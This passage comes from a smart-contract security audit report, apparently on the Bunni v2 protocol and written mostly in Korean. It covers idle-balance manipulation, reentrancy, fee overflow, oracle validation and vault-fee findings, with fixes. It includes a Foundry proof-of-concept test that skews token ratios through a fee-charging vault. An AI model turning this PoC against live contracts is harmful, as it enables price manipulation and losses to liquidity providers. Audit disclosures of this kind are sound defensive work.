1. 사용자는 두 토큰 모두에 대해 1e18을 입금하고 볼트 수수료를 지정하지 않습니다.
2. `_depositLogic()` 함수는 현재 토큰 비율을 기준으로 입금할 금액을 계산합니다. 따라서 `amount0`과 `amount1`을 `1e18` 토큰으로 계산합니다. 또한 `0.7e18` 토큰의 `reserveAmount0`를 계산합니다.
3. `BunniHub`는 raw 밸런스를 ERC-6909 형태로 발행하기 위해 `0.3e18` token0와 `1e18` token1을 Uniswap에 예치합니다.
4. 이제 `0.7e18` 토큰을 vault0에 입금하려고 시도합니다. 사용자가 10% 수수료를 전달하지 않았으므로 `0.63e18` 토큰의 `reserveChangeInUnderlying`을 계산합니다.
5. 이제 추가된 실제 가치를 사용하여 발행할 주식의 양을 계산합니다. 이 경우 `0.93e18` token0와 `1e18` token1이 됩니다. 최소값을 취하므로 `0.93e18` 주식을 발행합니다.
6. 이제 동일한 비율의 자금이 예치되었다고 가정하여 업데이트된 유휴 잔액을 계산합니다. 따라서 유휴 잔액이 이전에는 0이었으므로 이제도 0이 됩니다. 그러나 이 경우 `1e18` token1 값이 제공되었고 `0.93e18` token0만 제공되었습니다.

**Impact**
누구나 토큰 비율을 불균형하게 만들 수 있으며 이는 새로운 토큰 비율로 인해 후속 입금에 의해 증폭됩니다. 유휴 잔액은 스왑이 수행되는 활성 잔액을 얻기 위해 LDF를 쿼리할 때도 사용됩니다. 따라서 LP 토큰 가격이 총 Bunni 토큰 공급량과 풀의 유동성 양을 회계 처리하여 결정된다고 가정하면, 일종의 기부 공격을 통해 이 가격을 원자적으로 변경하는 것이 가능합니다. 이는 Bacon Labs가 대출 플랫폼에서 LP 토큰을 담보로 사용하는 것을 고려하려는 열망에 심각한 영향을 미칠 수 있습니다.

**Proof of Concept**
먼저 `test/mocks/ERC4626Mock.sol` 내에 다음 `ERC4626FeeMock`을 생성하십시오:

```solidity
contract ERC4626FeeMock is ERC4626 {
    address internal immutable _asset;
    uint256 public fee;
    uint256 internal constant MAX_FEE = 10000;

    constructor(IERC20 asset_, uint256 _fee) {
        _asset = address(asset_);
        if(_fee > MAX_FEE) revert();
        fee = _fee;
    }

    function setFee(uint256 newFee) external {
        if(newFee > MAX_FEE) revert();
        fee = newFee;
    }

    function deposit(uint256 assets, address to) public override returns (uint256 shares) {
        return super.deposit(assets - assets * fee / MAX_FEE, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

그런 다음 `test/BaseTest.sol` 가져오기에 추가하십시오:
```diff
--  import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++  import {ERC4626Mock, ERC4626FeeMock} from "./mocks/ERC4626Mock.sol";
```

이제 다음 테스트를 `test/BunniHub.t.sol`에 추가할 수 있습니다:
```solidity
    function test_WrongIdleBalanceComputation() public {
        ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
        Currency currency0 = Currency.wrap(address(token0));
        Currency currency1 = Currency.wrap(address(token1));
        ERC4626FeeMock feeVault0 = new ERC4626FeeMock(token0, 0);
        ERC4626 vault0_ = ERC4626(address(feeVault0));
        ERC4626 vault1_ = ERC4626(address(0));
        IBunniToken bunniToken;
        PoolKey memory key;
        (bunniToken, key) = hub.deployBunniToken(
            IBunniHub.DeployBunniTokenParams({
                currency0: currency0,
                currency1: currency1,
                tickSpacing: TICK_SPACING,
                twapSecondsAgo: TWAP_SECONDS_AGO,
                liquidityDensityFunction: uniformDistribution,
                hooklet: IHooklet(address(0)),
                ldfType: LDFType.DYNAMIC_AND_STATEFUL,
                ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
                hooks: bunniHook,
                hookParams: abi.encodePacked(
                    FEE_MIN,
                    FEE_MAX,
                    FEE_QUADRATIC_MULTIPLIER,
                    FEE_TWAP_SECONDS_AGO,
                    POOL_MAX_AMAMM_FEE,
                    SURGE_HALFLIFE,
                    SURGE_AUTOSTART_TIME,
                    VAULT_SURGE_THRESHOLD_0,
                    VAULT_SURGE_THRESHOLD_1,
                    REBALANCE_THRESHOLD,
                    REBALANCE_MAX_SLIPPAGE,
                    REBALANCE_TWAP_SECONDS_AGO,
                    REBALANCE_ORDER_TTL,
                    true, // amAmmEnabled
                    ORACLE_MIN_INTERVAL,
                    MIN_RENT_MULTIPLIER
                ),
                vault0: vault0_,
                vault1: vault1_,
                minRawTokenRatio0: 0.20e6,
                targetRawTokenRatio0: 0.30e6,
                maxRawTokenRatio0: 0.40e6,
                minRawTokenRatio1: 0,
                targetRawTokenRatio1: 0,
                maxRawTokenRatio1: 0,
                sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
                name: bytes32("BunniToken"),
                symbol: bytes32("BUNNI-LP"),
                owner: address(this),
                metadataURI: "metadataURI",
                salt: bytes32(0)
            })
        );

        // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
        uint256 depositAmount0 = 1e18 + 1;
        uint256 depositAmount1 = 1e18 + 1;
        address firstDepositor = makeAddr("firstDepositor");
        vm.startPrank(firstDepositor);
        token0.approve(address(PERMIT2), type(uint256).max);
        token1.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        // mint tokens
        _mint(key.currency0, firstDepositor, depositAmount0 * 100);
        _mint(key.currency1, firstDepositor, depositAmount1 * 100);

        // deposit tokens
        IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
            poolKey: key,
            amount0Desired: depositAmount0,
            amount1Desired: depositAmount1,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp,
            recipient: firstDepositor,
            refundRecipient: firstDepositor,
            vaultFee0: 0,
            vaultFee1: 0,
            referrer: address(0)
        });

        vm.startPrank(firstDepositor);
            (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);
            console.log("Amount 0 deposited by first depositor", firstDepositorAmount0In);
            console.log("Amount 1 deposited by first depositor", firstDepositorAmount1In);
            console.log("Total supply shares", bunniToken.totalSupply());
        vm.stopPrank();

        IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
        (uint256 idleAmountBefore, bool isToken0Before) = IdleBalanceLibrary.fromIdleBalance(idleBalanceBefore);
        feeVault0.setFee(1000);     // 10% fee

        depositAmount0 = 1e18;
        depositAmount1 = 1e18;
        address secondDepositor = makeAddr("secondDepositor");
        vm.startPrank(secondDepositor);
        token0.approve(address(PERMIT2), type(uint256).max);
        token1.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        // mint tokens
        _mint(key.currency0, secondDepositor, depositAmount0);
        _mint(key.currency1, secondDepositor, depositAmount1);

        // deposit tokens
        depositParams = IBunniHub.DepositParams({
            poolKey: key,
            amount0Desired: depositAmount0,
            amount1Desired: depositAmount1,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp,
            recipient: secondDepositor,
            refundRecipient: secondDepositor,
            vaultFee0: 0,
            vaultFee1: 0,
            referrer: address(0)
        });

        vm.prank(secondDepositor);
        (uint256 sharesSecondDepositor, uint256 secondDepositorAmount0In, uint256 secondDepositorAmount1In) = hub.deposit(depositParams);
        console.log("Amount 0 deposited by second depositor", secondDepositorAmount0In);
        console.log("Amount 1 deposited by second depositor", secondDepositorAmount1In);

        logBalances(key);
        console.log("Total shares afterwards", bunniToken.totalSupply());
        IdleBalance idleBalanceAfter = hub.idleBalance(key.toId());
        (uint256 idleAmountAfter, bool isToken0After) = IdleBalanceLibrary.fromIdleBalance(idleBalanceAfter);
        console.log("Idle balance before", idleAmountBefore);
        console.log("Is idle balance in token0 before?", isToken0Before);
        console.log("Idle balance after", idleAmountAfter);
        console.log("Is idle balance in token0 after?", isToken0Before);
    }
```

Output:
```
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_WrongIdleBalanceComputation() (gas: 4764066)
Logs:
  Amount 0 deposited by first depositor 1000000000000000000
  Amount 1 deposited by first depositor 1000000000000000000
  Total supply shares 1000000000000000000
  Amount 0 deposited by second depositor 930000000000000000
  Amount 1 deposited by second depositor 1000000000000000000
  Balance 0 1930000000000000000
  Balance 1 2000000000000000000
  Total shares afterwards 1930000000000000000
  Idle balance before 0
  Is idle balance in token0 before? true
  Idle balance after 0
  Is idle balance in token0 after? true

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.79s (6.24ms CPU time)

Ran 1 test suite in 1.79s (1.79s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** 다음 두 가지 가능한 해결책이 있습니다:
1. 사용자가 볼트 수수료를 지정하는 경우 `reserveChangeInUnderlying`이 예상 금액에서 너무 벗어나지 않도록 하여 사용자가 토큰 비율을 크게 수정할 수 없도록 합니다. 그러나 볼트 수수료가 0으로 지정된 경우 이 확인이 실행되지 않습니다. 두 경우 모두 `_depositLogic()` 함수에 의해 계산된 예상 결과에 대해 검증하고 `reserveChangeInUnderlying`이 크게 다른 경우 되돌리는 것을 고려하십시오.
2. 각 입금 후 유휴 잔액을 완전히 다시 계산하는 것을 고려하십시오.

**Bacon Labs:** [PR \#119](https://github.com/timeless-fi/bunni-v2/pull/119)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 유휴 잔액 조작 및 기부 공격을 피하기 위해 볼트 수수료가 0으로 지정된 경우에도 볼트 수수료 확인이 강제됩니다.


### Potential cross-contract re-entrancy between `BunniHub::deposit` and `BunniToken` can corrupt Hooklet state

**Description:** Hooklets는 풀 배포자가 초기화, 입금, 인출, 스왑 및 Bunni 토큰 전송과 같은 다양한 주요 풀 작업에 사용자 지정 로직을 주입할 수 있도록 하기 위한 것입니다.

Hooklet 호출이 실제 반환 값을 받도록 하려면 모든 작업 후 후크를 해당 함수의 끝에 배치해야 합니다. 그러나 `BunniHubLogic::deposit`은 `hookletAfterDeposit()` 호출이 실행되기 전에 초과 ETH를 사용자에게 환불하므로 사용자가 Hooklet의 상태가 업데이트되기 전에 Bunni 토큰을 전송할 때 교차 계약 재진입(cross-contract reentrancy)이 발생할 수 있습니다:

```solidity
    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...
        // refund excess ETH
        if (params.poolKey.currency0.isAddressZero()) {
            if (address(this).balance != 0) {
@>              params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount0Spent)
                );
            }
        } else if (params.poolKey.currency1.isAddressZero()) {
            if (address(this).balance != 0) {
@>              params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount1Spent)
                );
            }
        }

        // emit event
        emit IBunniHub.Deposit(msgSender, params.recipient, poolId, amount0, amount1, shares);

        /// -----------------------------------------------------------------------
        /// Hooklet call
        /// -----------------------------------------------------------------------

@>      state.hooklet.hookletAfterDeposit(
            msgSender, params, IHooklet.DepositReturnData({shares: shares, amount0: amount0, amount1: amount1})
        );
    }
```

이로 인해 입금 알림이 완료되기 전에 Hooklet에서 `BunniToken` 전송 후크가 호출됩니다:

```solidity
    function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
        ...
        // call hooklet
        // occurs after the referral reward accrual to prevent the hooklet from
        // messing up the accounting
        IHooklet hooklet_ = hooklet();
        if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
@>          hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        // call hooklet
        IHooklet hooklet_ = hooklet();
        if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
@>          hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
        }
    }
```

**Impact:** 잠재적인 영향은 주어진 Hooklet 구현의 사용자 지정 로직과 관련 회계에 따라 달라집니다.

**Recommended Mitigation:** 환불 로직을 `hookletAfterDeposit()` 호출 이후로 이동하는 것을 고려하십시오. 이렇게 하면 환불이 이루어지기 전에 Hooklet의 상태가 업데이트되어 재진입 가능성을 방지할 수 있습니다.

**Bacon Labs:** [PR \#120](https://github.com/timeless-fi/bunni-v2/pull/120)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `BunniHubLogic::deposit`의 초과 ETH 환불이 Hooklet 호출 이후로 이동되었습니다.


### Inconsistent Hooklet data provisioning for rebalancing operations

**Description:** Bunni는 Hooklet을 활용하여 풀 배포자가 다양한 풀 작업에 사용자 지정 로직을 주입할 수 있도록 하여 고급 전략 구현, 맞춤형 동작 및 외부 시스템과의 통합을 가능하게 합니다. 이러한 Hooklet은 초기화, 입금, 인출, 스왑 및 Bunni 토큰 전송을 포함한 주요 작업 중에 호출될 수 있습니다.

`IHooklet` 인터페이스를 기반으로 "작업 전" Hooklet 호출에는 사용자 입력 데이터가 전달되고 "작업 후" Hooklet 호출에는 작업 반환 데이터가 수신되는 것으로 보입니다. 입금, 인출 및 스왑 기능의 반환 데이터에는 항상 풀 준비금 변경 사항이 포함되어 있으며, 이는 Hooklet의 사용자 지정 로직에 사용될 수 있습니다:

```solidity
    struct DepositReturnData {
        uint256 shares;
@>      uint256 amount0;
@>      uint256 amount1;
    }

    ...

    struct WithdrawReturnData {
@>      uint256 amount0;
@>      uint256 amount1;
    }

    ...

    struct SwapReturnData {
        uint160 updatedSqrtPriceX96;
        int24 updatedTick;
@>      uint256 inputAmount;
@>      uint256 outputAmount;
        uint24 swapFee;
        uint256 totalLiquidity;
    }
```

그러나 프로토콜 리밸런싱 기능은 이러한 정보를 Hooklet에 전달하지 못하므로 변경되는 준비금에 기반한 사용자 지정 Hooklet 로직을 구현할 수 없습니다.

**Impact:** 리밸런싱 작업에 대한 준비금 정보가 부재하여 이 데이터에 의존하는 사용자 지정 로직을 구현하는 Hooklet의 능력이 제한됩니다. 데이터 프로비저닝의 이러한 불일치는 고급 전략 및 맞춤형 동작 개발을 방해하여 궁극적으로 프로토콜의 전반적인 기능과 유용성에 영향을 미칠 수 있습니다.

**Recommended Mitigation:** Bunni는 리밸런싱 작업 중에 Hooklet에 준비금 변경 정보를 제공해야 합니다. 이는 `afterSwap()` 후크를 재사용하여 달성할 수 있으며 `beforeSwap()` 후크를 구현하는 것도 유용할 수 있지만, 별도의 리밸런스 Hooklet 호출을 도입하는 것이 바람직합니다.

**Bacon Labs:** [PR \#121](https://github.com/timeless-fi/bunni-v2/pull/121) 및 [PR \#133](https://github.com/timeless-fi/bunni-v2/pull/133)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `IHooklet.afterRebalance`가 리밸런스 주문 실행 후에 호출됩니다.


### Swap fees can exceed 100\%, causing unexpected reverts or overcharging

**Description:** 동적 서지 수수료 메커니즘은 최대 100%의 서지 수수료에서 시작하여 기하급수적으로 감소함으로써 자율적인 유동성 수정 중 샌드위치 공격을 방지합니다. 풀이 am-AMM 관리자에 의해 관리될 때 스왑 수수료와 후크 수수료는 전체 스왑 금액을 사용하여 별도로 계산됩니다. 이 설계는 am-AMM 관리가 활성화/비활성화된 경우 간에 후크 수수료를 일관되지 않게 계산하는 문제를 해결하지만, 서지 수수료가 100%를 초과하는 것을 방지하지는 못합니다.

수수료 계산은 `BunniHookLogic::beforeSwap` 로직의 일부로 수행됩니다. 첫 번째 단계는 기본 스왑 수수료 백분율을 결정하는 것입니다 (1). am-AMM 관리가 비활성화된 경우 완전히 부과됩니다 (2 -> 3). 다른 경우에는 기본 수수료의 후크 수수료 부분만 부과되고 LP 수수료에 해당하는 기본 수수료 부분 대신 am-AMM 관리자 수수료가 사용됩니다 (4 -> 3). 따라서 전체 수수료는 `swapFeeAmount + hookFeesAmount`와 같습니다.

```solidity
(1)>    uint24 hookFeesBaseSwapFee = feeOverridden
            ? feeOverride
            : computeDynamicSwapFee(
                updatedSqrtPriceX96,
                feeMeanTick,
                lastSurgeTimestamp,
                hookParams.feeMin,
                hookParams.feeMax,
                hookParams.feeQuadraticMultiplier,
                hookParams.surgeFeeHalfLife
            );
        swapFee = useAmAmmFee
(4)>        ? uint24(FixedPointMathLib.max(amAmmSwapFee, computeSurgeFee(lastSurgeTimestamp, hookParams.surgeFeeHalfLife)))
(2)>        : hookFeesBaseSwapFee;
        uint256 hookFeesAmount;
        uint256 hookHandleSwapInputAmount;
        uint256 hookHandleSwapOutoutAmount;
        if (exactIn) {
            // compute the swap fee and the hook fee (i.e. protocol fee)
            // swap fee is taken by decreasing the output amount
(3)>        swapFeeAmount = outputAmount.mulDivUp(swapFee, SWAP_FEE_BASE);
            if (useAmAmmFee) {
                // instead of computing hook fees as a portion of the swap fee
                // and deducting it, we compute hook fees separately using hookFeesBaseSwapFee
                // and charge it as an extra fee on the swap
(5)>            hookFeesAmount = outputAmount.mulDivUp(hookFeesBaseSwapFee, SWAP_FEE_BASE).mulDivUp(
                    env.hookFeeModifier, MODIFIER_BASE
                );
            } else {
                hookFeesAmount = swapFeeAmount.mulDivUp(env.hookFeeModifier, MODIFIER_BASE);
                swapFeeAmount -= hookFeesAmount;
            }
```

am-AMM 관리가 활성화되어 있고 서지 수수료가 100%라고 가정하면 `computeSurgeFee()`는 `SWAP_FEE_BASE`를 반환하고 `swapFee`는 100%입니다 (4 -> 3). 그러나 `computeDynamicSwapFee()`가 반환하는 값도 다른 조건에 따라 최대 `SWAP_FEE_BASE`가 될 수 있으므로 `hookFeesBaseSwapFee`는 (0, `SWAP_FEE_BASE`] 범위에 있어 0이 아닌 `hookFeesAmount`가 발생합니다 (1 -> 5). 따라서 `swapFeeAmount + hookFeesAmount` 합계는 `outputAmount`를 초과하여 언더플로우로 인한 예상치 못한 되돌리기가 발생합니다.

```solidity
        // modify output amount with fees
@>      outputAmount -= swapFeeAmount + hookFeesAmount;
```

서지 수수료가 100%에 가까울 때 정확한 출력(exact output) 스왑의 경우 사용자에게 과다 청구될 수 있습니다:
```solidity
        } else {
            // compute the swap fee and the hook fee (i.e. protocol fee)
            // swap fee is taken by increasing the input amount
            // need to modify fee rate to maintain the same average price as exactIn case
            // in / (out * (1 - fee)) = in * (1 + fee') / out => fee' = fee / (1 - fee)
@>          swapFeeAmount = inputAmount.mulDivUp(swapFee, SWAP_FEE_BASE - swapFee);
            if (useAmAmmFee) {
                // instead of computing hook fees as a portion of the swap fee
                // and deducting it, we compute hook fees separately using hookFeesBaseSwapFee
                // and charge it as an extra fee on the swap
@>              hookFeesAmount = inputAmount.mulDivUp(hookFeesBaseSwapFee, SWAP_FEE_BASE - hookFeesBaseSwapFee).mulDivUp(
                    env.hookFeeModifier, MODIFIER_BASE
                );
            } else {
                hookFeesAmount = swapFeeAmount.mulDivUp(env.hookFeeModifier, MODIFIER_BASE);
                swapFeeAmount -= hookFeesAmount;
            }

            // set the am-AMM fee to be the swap fee amount
            // don't need to check if am-AMM is enabled since if it isn't
            // BunniHook.beforeSwap() simply ignores the returned values
            // this saves gas by avoiding an if statement
```solidity
            (amAmmFeeCurrency, amAmmFeeAmount) = (inputToken, swapFeeAmount);

            // modify input amount with fees
@>          inputAmount += swapFeeAmount + hookFeesAmount;
```

**Impact:** am-AMM 관리가 활성화되고 서지 수수료가 100%에 가까워지면 전체 스왑 수수료 금액인 `swapFeeAmount + hookFeesAmount`가 출력 금액을 초과하여 예상치 못한 되돌리기가 발생할 수 있습니다. 또한 서지 수수료가 100%에 가까울 때 정확한 출력(exact output) 스왑에 대해 사용자에게 과다 청구될 수 있습니다.

**Recommended Mitigation:** `hookFeesAmount`를 서지 수수료에서 공제하여 전체 스왑 수수료 금액이 100%로 제한되고 100%에서 올바르게 감소하도록 하는 것을 고려하십시오.

**Bacon Labs:** [PR \#123](https://github.com/timeless-fi/bunni-v2/pull/123)에서 수정되었습니다. 정확한 출력 스왑 중에 스와퍼에게 잠재적으로 과다 청구하는 문제를 인정하며, LP에게 이익이 되는 것을 선호하므로 괜찮습니다.

**Cyfrin:** 검증되었습니다. 이제 `BunniHookLogic::beforeSwap`에서 수수료 합계가 출력 금액을 초과하는 경우가 명시적으로 처리되어, 후크 수수료가 항상 일관되도록 am-Amm/동적 스왑 수수료에서 공제합니다.


### `OracleUniGeoDistribution` oracle tick validation is flawed

**Description:** `OracleUniGeoDistribution::floorPriceToRick`은 주어진 채권 토큰 바닥 가격에 해당하는 반올림된 틱을 계산합니다:

```solidity
function floorPriceToRick(uint256 floorPriceWad, int24 tickSpacing) public view returns (int24 rick) {
    // convert floor price to sqrt price
    // assume bond is currency0, floor price's unit is (currency1 / currency0)
    // unscale by WAD then rescale by 2**(96*2), then take the sqrt to get sqrt(floorPrice) * 2**96
    uint160 sqrtPriceX96 = ((floorPriceWad << 192) / WAD).sqrt().toUint160();

    // convert sqrt price to rick
    rick = sqrtPriceX96.getTickAtSqrtPrice();
    rick = bondLtStablecoin ? rick : -rick; // need to invert the sqrt price if bond is currency1
    rick = roundTickSingle(rick, tickSpacing);
}
```

이 함수는 `OracleUniGeoDistribution::isValidParams` 내에서 호출됩니다:

```solidity
    function isValidParams(PoolKey calldata key, uint24, /* twapSecondsAgo */ bytes32 ldfParams)
        public
        view
        override
        returns (bool)
    {
        // only allow the bond-stablecoin pairing
        (Currency currency0, Currency currency1) = bond < stablecoin ? (bond, stablecoin) : (stablecoin, bond);

        return LibOracleUniGeoDistribution.isValidParams(
@>          key.tickSpacing, ldfParams, floorPriceToRick(oracle.getFloorPrice(), key.tickSpacing)
        ) && key.currency0 == currency0 && key.currency1 == currency1;
    }
```

그리고 `tickLower/Upper`를 알리는 결과 오라클 틱의 검증은 `oracleTickOffset`도 적용되는 `LibOracleUniGeoDistribution::isValidParams` 내에서 수행됩니다:

```solidity
    function isValidParams(int24 tickSpacing, bytes32 ldfParams, int24 oracleTick) internal pure returns (bool) {
        // decode params
        // | shiftMode - 1 byte | distributionType - 1 byte | oracleIsTickLower - 1 byte | oracleTickOffset - 2 bytes | nonOracleTick - 3 bytes | alpha - 4 bytes |
        uint8 shiftMode = uint8(bytes1(ldfParams));
        uint8 distributionType = uint8(bytes1(ldfParams << 8));
        bool oracleIsTickLower = uint8(bytes1(ldfParams << 16)) != 0;
        int24 oracleTickOffset = int24(int16(uint16(bytes2(ldfParams << 24))));
        int24 nonOracleTick = int24(uint24(bytes3(ldfParams << 40)));
        uint32 alpha = uint32(bytes4(ldfParams << 64));

@>      oracleTick += oracleTickOffset; // apply offset to oracle tick
@>      (int24 tickLower, int24 tickUpper) =
            oracleIsTickLower ? (oracleTick, nonOracleTick) : (nonOracleTick, oracleTick);
        if (tickLower >= tickUpper) {
            // ensure tickLower < tickUpper
            // use the non oracle tick as the bound
            // LDF needs to be at least one tickSpacing wide
            (tickLower, tickUpper) =
                oracleIsTickLower ? (tickUpper - tickSpacing, tickUpper) : (tickLower, tickLower + tickSpacing);
        }

        bytes32 geometricLdfParams =
        bytes32(abi.encodePacked(shiftMode, tickLower, int16((tickUpper - tickLower) / tickSpacing), alpha));

        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));

        // validity conditions:
        // - geometric LDF params are valid
        // - uniform LDF params are valid
        // - shiftMode is static
        // - distributionType is valid
        // - oracleTickOffset is aligned to tickSpacing
        // - nonOracleTick is aligned to tickSpacing
        return LibGeometricDistribution.isValidParams(tickSpacing, 0, geometricLdfParams)
            && tickLower % tickSpacing == 0 && tickUpper % tickSpacing == 0 && tickLower >= minUsableTick
            && tickUpper <= maxUsableTick && shiftMode == uint8(ShiftMode.STATIC)
            && distributionType <= uint8(type(DistributionType).max) && oracleTickOffset % tickSpacing == 0
            && nonOracleTick % tickSpacing == 0;
    }
```

그러나 `OracleUniGeoDistribution::query`와 같은 `floorPriceToRick()`의 다른 호출에서는 이러한 검증이 수행되지 않으므로 `oracle.getFloorPrice()`가 다른 값을 반환하면 최소/최대 사용 가능 틱 검증이 위반될 수 있습니다. 현재 오라클이 다른 가격을 반환하면 추가 검증 없이 서지 로직을 트리거합니다:

```solidity
if (initialized) {
    // should surge if param was updated or oracle rick has updated
    shouldSurge = lastLdfParams != ldfParams || oracleRick != lastOracleRick;
}
```

오라클 틱 오프셋이 오라클 틱에 적용되고 후속 `tickLower/Upper`가 틱 간격에 정렬되도록 강제된다는 점을 감안할 때, 틱은 이미 `floorPriceToRick()`에서 rick으로 반올림되었으므로 오라클 틱 오프셋이 정렬되었는지 추가로 강제할 필요는 없습니다.

**Impact:** `query()`, `computeSwap()` 또는 `cumulativeAmount0/1()` 내의 `floorPriceToRick()` 호출에서는 오라클 틱에 대한 검증이 수행되지 않습니다. 오라클이 최소/최대 사용 가능 틱을 벗어나는 바닥 가격을 보고하면 `[MIN_TICK, minUsableTick]` 및 `[maxUsableTick, MAX_TICK]` 범위에서 실행이 진행될 수 있습니다.

**Recommended Mitigation:** `LibOracleUniGeoDistribution::decodeParams`에 검증을 추가하여 바닥 가격이 변경되는 경우 오라클 rick을 사용하여 계산된 틱이 사용 가능한 틱 범위 내에 포함되도록 하십시오.

**Bacon Labs:** [PR \#97](https://github.com/timeless-fi/bunni-v2/pull/97)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `OracleUniGeoDistribution`은 이제 `LibOracleUniGeoDistribution::decodeParams`에서 최소 및 최대 사용 가능 틱으로 틱 범위를 제한하여 다른 `floorPriceToRick()` 호출에서 사용 시 검증이 적용되도록 합니다.


### `BunniHook::beforeSwap` does not account for vault fees paid when adjusting raw token balances which could result in small losses to liquidity providers

**Description:** 풀 입금 시와 달리 `BunniHook::beforeSwap`은 입력 토큰이 해당 작업에 수수료를 부과하는 볼트로 이동하거나 볼트에서 이동되는 스왑에 대해 추가 수수료를 부과하지 않습니다. `BunniHub`는 토큰을 지정된 볼트에 입금해야 하는지 확인하는 `hookHandleSwap()` 함수를 통해 스왑을 처리합니다. `rawBalance`가 `maxRawBalance`를 초과하면 `targetRawBalance` 값에 도달하기 위해 일부가 볼트에 입금됩니다. 0이 아닌 볼트 수수료는 입금된 금액에서 청구되어 유동성 공급자에게 비례적으로 속하는 풀의 잔액을 조용히 감소시킵니다:

```solidity
    function _updateRawBalanceIfNeeded(
        Currency currency,
        ERC4626 vault,
        uint256 rawBalance,
        uint256 reserve,
        uint256 minRatio,
        uint256 maxRatio,
        uint256 targetRatio
    ) internal returns (uint256 newReserve, uint256 newRawBalance) {
        uint256 balance = rawBalance + getReservesInUnderlying(reserve, vault);
        uint256 minRawBalance = balance.mulDiv(minRatio, RAW_TOKEN_RATIO_BASE);
@>      uint256 maxRawBalance = balance.mulDiv(maxRatio, RAW_TOKEN_RATIO_BASE);

@>      if (rawBalance < minRawBalance || rawBalance > maxRawBalance) {
            uint256 targetRawBalance = balance.mulDiv(targetRatio, RAW_TOKEN_RATIO_BASE);
            (int256 reserveChange, int256 rawBalanceChange) =
@>              _updateVaultReserveViaClaimTokens(targetRawBalance.toInt256() - rawBalance.toInt256(), currency, vault);
            newReserve = _updateBalance(reserve, reserveChange);
            newRawBalance = _updateBalance(rawBalance, rawBalanceChange);
        } else {
            (newReserve, newRawBalance) = (reserve, rawBalance);
        }
    }
```

또한 유동성 분포가 이동되어야 하는 경우 스왑이 리밸런스를 트리거할 수 있으므로, 이러한 초과 자금 중 일부는 리밸런스가 실행될 때 다시 인출하기 위해 불필요하게 볼트 수수료를 지불하는 대신 리밸런스 실행에 사용될 수 있습니다.

사용자가 이미 초기화된 유동성 형태를 가진 풀에 입금할 때, 현재 `BunniHubLogic::_depositLogic`은 목표 비율을 무시하고 현재 준비금/raw 밸런스 비율로 토큰을 추가하기만 합니다. 따라서 이러한 잔액이 최대 raw 밸런스에 가까울수록 호출자가 준비금에 입금하는 토큰은 적어집니다. 이 라인에서 나눗셈이 더 작아지기 때문입니다:

```solidity
returnData.reserveAmount0 = balance0 == 0 ? 0 : returnData.amount0.mulDiv(reserveBalance0, balance0);
returnData.reserveAmount1 = balance1 == 0 ? 0 : returnData.amount1.mulDiv(reserveBalance1, balance1);
```

그런 다음 최대 raw 밸런스를 초과하는 스왑이 발생하면 풀은 볼트에 입금하여 목표 비율에 도달하려고 시도합니다. 그러나 0이 아닌 볼트 수수료가 있으면 유동성 공급자가 초과 지불하게 됩니다. 볼트 준비금에 대한 이전 입금이 목표 비율로 이루어지지 않았기 때문에, 원래 호출자가 지불한 경우에 비해 스왑 중에 지불될 때 이 비례 수수료 금액이 약간 더 커집니다.

**Impact:** 스왑 중 볼트 수수료가 풀 유동성에서 지불되어 유동성 공급자에게 약간의 손실을 초래할 수 있습니다. 그러나 LP가 볼트 수수료를 지불하도록 하기 위해 악의적인 사용자가 반복적으로 `BunniHub`가 볼트에 자금을 입금하게 만드는 것은 쉽게 트리거되지 않는 것으로 보입니다. 이는 raw 밸런스가 최대 금액을 초과하고 스왑 수수료 지불을 포함하는 스왑 실행이 raw 토큰 비율을 불균형하게 만드는 데 필요할 때만 발생하기 때문입니다.

**Recommended Mitigation:** 다음을 고려하십시오:
* 목표 비율에 비례하여 입력 금액에서 볼트 수수료를 청구합니다. 정확한 입력(exact-in)의 경우 볼트 수수료는 스왑 로직 시작 시 공제되어야 하며, 정확한 출력(exact-out)의 경우 스왑 로직 종료 시 공제되어야 합니다.
